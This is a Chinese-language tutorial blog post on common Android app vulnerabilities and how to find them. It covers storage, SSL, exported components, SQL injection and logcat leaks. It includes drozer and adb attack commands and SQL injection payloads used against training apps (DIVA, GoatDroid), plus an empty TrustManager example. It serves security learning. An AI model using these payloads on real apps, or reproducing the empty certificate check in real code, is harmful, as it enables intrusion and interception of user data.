---
title: Android APP常见漏洞和挖掘技巧
date: 2018-02-12 00:00:00
categories:
- CTF/Android
tags:
---

## 基本知识
本节内容的安全问题主要属于是Android架构上两层的，即应用框架层和应用层。

### 应用框架层

> 仅仅罗列框架的名字是没有用的，如果不能知道这些框架或者组件如何应用，是无法从根本上理解这个分层结构的（暂时放着等待解决）

- Views
- Content Providers
- Resource Manager
- Notification Manager
- Activity Manager
- Window Manager
- Package Manager

### 应用层
- 系统应用
- 其他应用

### 四大组件

> 应用组件是组成安卓应用的关键部分。每个应用都是由一个或者多个组件组成，并且每个都是单独调用。

- Activity
- Service
- Broadcast Receiver
- Content Provider

### 问题
四大组件是哪层的？

## 典型漏洞及挖掘方法
### 数据存储漏洞(M1&M2)
- Android系统中本地的存储位置包括
    - Shared Preferences
        - 基于XML文件的key-value数据存储方式，一般用于储存应用的配置等信息
        - 常规位置: /data/data/<package-name>/shared_prefs/*.xml
    - SQLite Databases
        - 轻量级的关系型数据库
        - 常规位置: /data/data/<package-name>/database/*.db
    - Internal Storage
        - 使用设备内部存储器来创建和保存文件，通常情况下内部存储的文件只能被该当前程序访问，不可被其他程序或用户访问 
        - 常规位置: /data/data/<package-name>/files/*
    - External Storage
        - 使用外部存储器(如sd卡等)创建和保存文件，以这种方式创建的文件通常是全局可读的，可被所有具有“READ_EXTERNAL_STORAGE”或“WRITE_EXTERNAL_STORAGE”权限的APP 访问
        - 其常规路径为:/mnt/sdcard/*
#### 成因
- 创建以上文件时没有使用MODE_PRIVATE模式，而是使用了MODE_WORLD_READABLE或MODE_WORLD_WRITEABLE模式，导致其他程序可以读取内容。
- 即一般来说/data/data/<package-name>/目录下的文件是其他用户不可读的，但是如果使用不恰当的方式创建将会改变文件权限，这样便可能将私密文件泄露给其他用户。

#### 检测
1. 使用adb shell连接手机并获取root权限，浏览/data/data/<package-name>目 录下的shared_pref、database、files等目录，检查是否存在others用户可读 的文件
2. 检查shared_pref配置文件、数据库、内部和外部存储的文件中是否明文存 储了敏感信息

### 数据通信漏洞(M3)
#### 敏感信息明文传输漏洞
明文直接传，没什么好说的，攻击者通过局域网嗅探、恶意公共WIFI、恶意代理服务、DNS劫持等手段可以捕获客户端和服务端之间的明文通信，获取用户账号密码、登陆 session等敏感信息或者发起中间人攻击(MITM)。
#### SSL证书弱校验漏洞
##### 成因
不对Server端证书进行校验导致的TLS中间人攻击，开发者在校验证书时需要实现X509TrustManager类，包括checkClientTrusted、 checkServerTrusted、getAcceptedIssuers三个方法，如下：

```java
private class MyTrustManager implements X509TrustManager{  
  
                @Override  
                public void checkClientTrusted(X509Certificate[] chain, String authType)  
                                throws CertificateException {  
                        // TODO Auto-generated method stub  
                          
                }  
  
                @Override  
                public void checkServerTrusted(X509Certificate[] chain, String authType)  
                                throws CertificateException {  
                        // TODO Auto-generated method stub  
                          
                }  
  
                @Override  
                public X509Certificate[] getAcceptedIssuers() {  
                        // TODO Auto-generated method stub  
                        return null;  
                }          
    }    
```

1. 如果客户端APP在实现X509TruestManager类的checkServerTrusted 方法时，函数体为空，则不对服务端证书进行校验，会导致SSL证书弱校验漏洞。
2. 如果客户端APP在使用HttpsURLConnection时，实现自定义 HostnameVerifier过程中未对主机名做验证，则默认不检查证书域名与站点域名是否匹配;或者在设置HttpsURLConnection的HostnameVerifier时，将其设为ALLOW_ALL_HOSTNAME_VERIFIER，则接受所有域名。这种不当的编程方式会导致SSL证书弱校验。

##### 检测
1. 终端检测：对存在SSL证书弱校验漏洞的APP实施HTTPS中间人攻击
- 开启Fiddler的HTTPS解析功能，生成并导出自签名证书，安装到手机中
- 开启Fiddler代理，并允许远程主机连接该代理
- 配置手机使其使用Fiddler提供的代理
- 执行APP并进行网络操作，在Fiddler中查看捕获的数据
- 检查是否能获得HTTPS通信的明文数据
2. 代码检测
- 搜索 .method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
- 定位.method和.end method中间的函数体
- 检测是否仅有 return-void
- 同理检测verify(String,SSLSession) 函数体或者否存在SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER


#### 使用Xposed框架绕过SSL强校验
对SSL强校验使用的函数进行Hook，强制使得校验结果为True。
### 组件暴露漏洞(M1&M6)
#### 成因
- android:exported
是Activity，Service，Provider，Receiver 组件中都 有的一个属性。用来标识是否支持其它应用调用当前组件。
- 如果有intent-filter，默认值为true; 没有intent-filter，默认值为false
-  exported的组件可以被第三方APP调用，在权限控制不当的情况下，可能导致敏感信息泄露、绕过认证、越权行为执行等风险
#### 案例
- 华为网盘(V7)客户端Activity组件暴露导致本地密码绕过(WooYun-2014-048502)  
http://wy.hx99.net/bug_detail.php?wybug_id=wooyun-2014-048502
- 小米bugreport程序Receiver组件暴露导致敏感信息暴露 (WooYun-2012-08222)  
 http://wy.hx99.net/bug_detail.php?wybug_id=wooyun-2012-08222
#### 检测
1. 手动查看
- 获取AndroidManifest.xml文件
    - 反编译获得
    - 使用Re浏览器查看/data/app/<package-name>/*.apk，选择查看 AndroidManifest.xml
- 查看Activity、Receiver、Service、 Provider等组件是否被导出或默认导出
    - 具有intent-filter标签时，默认为exported=true
    - 不具有intent-filter标签时，默认为exported=false
- 导出的组件是否有signature以上级别的权限控制
2. 使用drozer

```bash
dz> run app.package.attacksurface <package-name> //查看暴露组件
dz> run app.activity.info -a <package-name> -i //查看activity信息
dz> run app.service.info -a <package-name> -i //查看service信息
dz> run app.broadcast.info -a <package-name> -i //查看broadcast receiver信息
```

#### 实验
##### Activity暴露导致绕过认证
> http://bobao.360.cn/learning/detail/122.html  
apk样本: https://pan.baidu.com/s/1eSZZZyi  密码:x07t
- 可以反编译manifest文件查看组件的导出选项是否为ture
- 或者采用drozer来自动分析app的攻击面

1. 查看攻击面，发现两个导出的Activity

```bash
dz> run app.package.attacksurface com.isi.testapp
Attack Surface:
  2 activities exported
  0 broadcast receivers exported
  0 content providers exported
  0 services exported
    is debuggable
```

2. 查看Activity具体信息，获得两个Activity名字
```bash
dz> run app.activity.info -a com.isi.testapp -i
Package: com.isi.testapp
  com.isi.testapp.MainActivity
    Permission: null
    Intent Filter:
      Actions:
        - android.intent.action.MAIN
      Categories:
        - android.intent.category.LAUNCHER
  com.isi.testapp.Welcome
    Permission: null
```

3. 尝试启动Welcome这个Activity，的确绕过了MainActivity的登录验证

```bash
$ adb shell am start –n com.isi.testapp/.Welcome
```

4. 这个是否多此一举呢？想看Welcome的Activity直接在layout看这个活动的布局不可以么？我们反编译apk找到这个布局文件来看一下!

```xml
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout android:layout_height="fill_parent" android:layout_width="fill_parent" android:orientation="vertical" xmlns:android="http://schemas.android.com/apk/res/android">
    <Gallery android:background="@drawable/infosec" android:id="@id/gallery1" android:layout_gravity="center" android:layout_height="234.0dip" android:layout_marginTop="40.0dip" android:layout_width="278.0dip" />
    <TextView android:id="@id/tvdisplay" android:layout_gravity="center" android:layout_height="wrap_content" android:layout_marginTop="20.0dip" android:layout_width="wrap_content" android:text="Private Area" android:textColor="#ff0000ff" android:textSize="40.0dip" android:typeface="monospace" />
</LinearLayout>
```

如果将这个layout渲染过后的确可以看到和启动活动的一样的效果，但这是因为这个布局是写死的静态，如果这个Activity运行起来布局信息将作出更改，则我们也许可以看到一些敏感的信息，如案例中的华为网盘。

##### BroadcastReceiver暴露导致发送短信

> 样本fourgoats.apk介绍  
出自OWASP的GoatDroid项目，集成了一堆漏洞的APK，代码未经过混淆与加密，可以反编译后看到比较清晰的逻辑，分析漏洞成因。虽然是许多年前的项目，很多漏洞也早已消失，但对于入门的新手来说还是有一定的价值的。下载地址：https://pan.baidu.com/s/1o957Nku  密码:ssz9  

1. 查看攻击面，找到一个导出的广播接收器

```bash
dz> run app.package.attacksurface org.owasp.goatdroid.fourgoats
Attack Surface:
  4 activities exported
  1 broadcast receivers exported
  0 content providers exported
  1 services exported
    is debuggable
```

2. 查看Broadcast具体信息，找到广播的类名，以及注册的Intent的动作

```bash
dz> run app.broadcast.info -a org.owasp.goatdroid.fourgoats -i
Package: org.owasp.goatdroid.fourgoats
  org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver
    Intent Filter:
      Actions:
        - org.owasp.goatdroid.fourgoats.SOCIAL_SMS
    Permission: null
```

3. 如何利用？视频中老师直接给出以下这条命令：

```bash
dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 10010 --extra string message hacked!

```

- 但是很奇怪这里phoneNumber以及message这个变量名字是如何得到的呢？还是只要是发送短信的广播接收器通用接受这两个参数？其实当然不是了。在上课的时候老师跳过了这个步骤，这里应当继续找到这个广播接收器的代码实现。  
- 因为软件没有加壳没有混淆，所以反编译后目录结构清楚，很容易找SendSMSNowReceiver结果如下：

```java
package org.owasp.goatdroid.fourgoats.broadcastreceivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import org.owasp.goatdroid.fourgoats.misc.Utils;

public class SendSMSNowReceiver extends BroadcastReceiver {
    Context context;

    public SendSMSNowReceiver() {
        super();
    }

    public void onReceive(Context arg8, Intent arg9) {
        this.context = arg8;
        SmsManager v0 = SmsManager.getDefault();
        Bundle v6 = arg9.getExtras();
        v0.sendTextMessage(v6.getString("phoneNumber"), null, v6.getString("message"), null, null);
        Utils.makeToast(this.context, "Your text message has been sent!", 1);
    }
}
```

- 在这里我们获取到参数名字，于是可以开心通过Intent去调用SOCIAL_SMS（在Manifest中注册的名字，不是类名SendSMSNowReceive）

```bash
dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 10010 --extra string message hacked!
```

4. 这里是发送短信，上课的时候我以为是接收短信，是否可以伪造接受短信呢？

答案是确定的，当系统本身的短信服务**com.android.mms.transaction.SmsReceiverService**出了问题的时候也许就可以去伪造一封短信了。请自行研究。

5. 引用  

Android安全项目入门篇  
https://bbs.pediy.com/thread-219107.htm  
Android应用渗透测试  
http://blog.csdn.net/starflier/article/details/21229301

#### 防护
对导出组件的权限控制

> 如果开发者需要对自己的应用程序或服务(尤其exported的)进行访问控制，可 以在AndroidManifest.xml中添加<permission>标签，将其属性中的 protectionLevel设置为以下级别中的一种:
-  normal:低风险权限，运行时系统会自动授予权限给 app
- dangerous:高风险权限，系统不会自动授予权限给 app，在用到的时候会，会给用户提示
- signature:签名权限，将权限授给具有相同数字签名的应用程序
- signatureOrSystem:签名或系统权限，将权限授给具有相同数字签名的应用程序或系统类app  

思考：是否可以通过验证启动方式来防护呢？

### SQL注入漏洞(M7)

#### 成因

在使用sqlite数据库时没有采取合适的过滤输入方法，导致sql语句可被拼接以及改写。Android应用一般在如下两个位置来完成数据库的操作：即Content Providers和Activity中。

#### sqlite

1. Android中的数据库实现为sqlite，一种轻量级基于文件的数据库。
2. 一个数据库就是一个db文件，一般保存在/data/data/<package-name>/databases/*.db
3. db文件可以使用支持查看sqlite的软件打开，如navicat，SQLiteManager等，或者使用sqlite命令直接进入数据库的命令行模式。
4. 在创建时权限一般为其他用户不可访问的私有数据，权限配置不当会出现数据存储漏洞（漏洞1）。当然root权限可以直接拿到。
5. sqlite本身不提供加密，但是仍可使用相应的工具对数据库文件进行加密，如SQLCipher，微信中的EnMicroMsg.db就是采取这种方式加密的。
6. 即使是本地加密了数据库，本质上仍是把钥匙和锁放在一起，并没太大作用，破解者可以通过逆向的方式找到加密秘钥。

#### 实验

> 实验apk为DIVA，一个故意设计的存在很多漏洞的Android app
链接:https://pan.baidu.com/s/1i63a9OL  密码:qrx4

##### DIVA

> Android App常见安全问题演练分析系统-DIVA-Part1
https://www.anquanke.com/post/id/84603

> Android App常见安全问题演练分析系统-DIVA-Part2
https://www.anquanke.com/post/id/86057


##### Content Providers中注入
> ContentProvider使用场景解读
https://www.jianshu.com/p/cdef889736ec
###### 条件
1. Content Providers组件暴露
2. 没有对输入进行有效的过滤
###### 检测
使用drozer进行检测：发现在Projection和Selection处均存在注入

```bash
dz>run scanner.provider.injection -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Not Vulnerable:
  content://jakhar.aseem.diva.provider.notesprovider
  content://jakhar.aseem.diva.provider.notesprovider/

Injection in Projection:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes

Injection in Selection:
  content://jakhar.aseem.diva.provider.notesprovider/notes/
  content://jakhar.aseem.diva.provider.notesprovider/notes
```


###### 分析
1. Projection和Selection是啥?

ContentProvider中重写了query方法

```java
@Override
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)

其中Projection和Selection为query函数的参数，这两个参数会被拼接到sql语句中，位置如下:

select (projection) from tablename where (selection)
```

2. 查看DIVA反编译结果
```java
  public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
        queryBuilder.setTables(TABLE);
        switch (urimatcher.match(uri)) {
            case 1:
                break;
            case 2:
                queryBuilder.appendWhere("_id=" + uri.getLastPathSegment());
                break;
            default:
                throw new IllegalArgumentException("Divanotes(query): Unknown URI " + uri);
        }
        if (sortOrder == null || sortOrder == "") {
            sortOrder = C_TITLE;
        }
        // 到此为止并没对projection, selection进行过滤，直接使用参数进行数据库的操作了
        Cursor cursor = queryBuilder.query(this.mDB, projection, selection, selectionArgs, null, null, sortOrder);
        cursor.setNotificationUri(getContext().getContentResolver(), uri);
        return cursor;
    }
```

###### 注入
使用drozer注入:这里我们使用projection参数注入，当然也可以采用selection注入，不过payload有不同
1. 爆出表名

```bash
run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM SQLITE_MASTER WHERE type='table';--"
```

> SQLite数据库中有一个内置表,名为SQLITE_MASTER,此表中存储着当前数据库中所有表的相关信息
2. 爆出表中数据

```bash
run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM notes ;--"
```

##### Activity中注入
就是整个操作数据库的逻辑在Activity中完成，DIVA中的第七关
###### 检测
因为这种在Activity的操作不方便自动检查，只能去看源码:DIVA中SQLInjectionActivity
```java
    public void search(View view) {
        EditText srchtxt = (EditText) findViewById(R.id.ivi1search);
        try {
        //直接拼接输入框中的字符串，没有任何过滤
            Cursor cr = this.mDB.rawQuery("SELECT * FROM sqliuser WHERE user = '" + srchtxt.getText().toString() + "'", null);
            StringBuilder strb = new StringBuilder("");
            if (cr == null || cr.getCount() <= 0) {
                strb.append("User: (" + srchtxt.getText().toString() + ") not found");
            } else {
                cr.moveToFirst();
                do {
                    strb.append("User: (" + cr.getString(0) + ") pass: (" + cr.getString(1) + ") Credit card: (" + cr.getString(2) + ")\n");
                } while (cr.moveToNext());
            }
            Toast.makeText(this, strb.toString(), 0).show();
        } catch (Exception e) {
            Log.d("Diva-sqli", "Error occurred while searching in database: " + e.getMessage());
        }
    }
```

###### 注入
直接输入框爆出所有用户名密码

```bash
'or'1'='1
```

#### 防护
无论是哪种方式来操作数据库都应该做好输入的过滤，并且保护好db文件，可采用适当的方式加密
#### 微信数据库破解
> http://blog.csdn.net/qq_24280381/article/details/73521836
#### SQLCipher之攻与防
> http://www.freebuf.com/articles/database/108904.html
### logcat数据泄露漏洞(M10)
#### 成因
在APP的开发过程中，为了方便调试，开发者通常会用logcat输出info、debug、error 等信息。如果在APP发布时没有去掉logcat信息，可能会导致攻击者通过查看logcat日志获得敏感信息。
- log.v :详细信息
- log.d: debug信息 
- log.i: info信息
- log.w: warning信息
- log.e: Error信息
#### 检测
1. 静态检测  
- 使用apktool等工具将APK文件反编译为smali代码，检索是否有logcat操作,例如:

```smali
Landroid/util/Log;->d( 
Landroid/util/Log;->v(
```

2. 动态检测
- 启动android sdk中的ddms或monitor
- 打开app并操作，在ddms窗口中选择app并设置要观测的tag，观察logcat日志中是否有敏感内容
## 流程总结
![image](http://ww3.sinaimg.cn/large/0060lm7Tly1fo3htlr2r7j31kw0e6dv6.jpg)

### 静态分析（检测）
> 快速检测，获得分析重点目标

使用apktool等工具对APK文件进行反编译，对反编译得到的文件和代码进行分析：
- AndroidManifest文件分析，检查Activity、Service、Receiver、Provider等组件是否存在暴露风险
- Smali代码分析，通过自动化脚本检测已知特征的漏洞风险，如数据存储漏洞、SSL证书校验漏洞、弱加 密漏洞、webview漏洞等

### 动态分析（验证）
> 对疑似风险进行验证和危害评估，主要是验证静态分析出来的风险

- 调试模式分析：使用adb调试模式进行分析
    - 验证组件暴露风险
    - 验证数据存储风险等
- APP人工操作：人工运行和操作APP的各项功能
    - 熟悉其功能和逻辑
    - 对可能存在的通用控件漏洞或控件使用不当造成的漏洞(如webview等)进行验证
- 网络数据分析：使用抓包工具，或者Fiddler等代理工具捕获分析 http(s)数据
    - 重点针对可能包含敏感数据传输的网络接口(如登陆信息、订单信息、 用户信息等) 
    - 明文传输漏洞验证:是否采用明文传输敏感信息(密码等)
    - SSL弱加密漏洞验证:使用Fiddler自签名证书进行内容还原
    - SSL强加密:使用Xposed插件进行绕过
    - 服务端接口分析:是否存在测试接口、未进行身份验证的接口、可暴力爬取敏感数据的接口等

### drozer（检测+验证）
> 集成静态分析与动态验证的工具，按照逻辑属于动态分析中的调试模式分析。
- 检测组件暴露、SQL注入等漏洞初步检测
- 如果存在以上漏洞，验证其风险，是否否导致敏感数据泄漏、验证绕过、非授权操作等。

### 逆向分析（CTF重点）
- Java文件逆向分析：  
采用SDK编写的代码，通过dex2jar、JD-GUI等工具可将其还原为java代码
- So文件逆向分析：  
采用NDK编写的代码，使用IDA加载so文件进行分析，使用Hex-rays插件将函数体转为C 语言
- 半调试半逆向：  
对于一些重要变量的值，可通过在smali代码中添加logcat代码，然后重打包生成新的APK 文件，运行该APK文件时通过DDMS查看logcat的输出
加密破解以及对逻辑和代码的进一步分析

### 自动化辅助

#### 开源系统

- MobSF  
包含Web界面 支持静态和动态分析，App后端Web API漏洞检测
- Marvin  
包括前端Web界面，部署麻烦 支持静态分析、动态分析、APP Ui自动遍历
- Inspeckage  
Xposed插件，包含WEB界面
能够查看Manifest信息、文件内容、Logcat日志、网 络通信等，能够调用未导出组件

#### 在线系统

腾讯御安全，阿里聚安全，360显危镜，梆梆，娜迦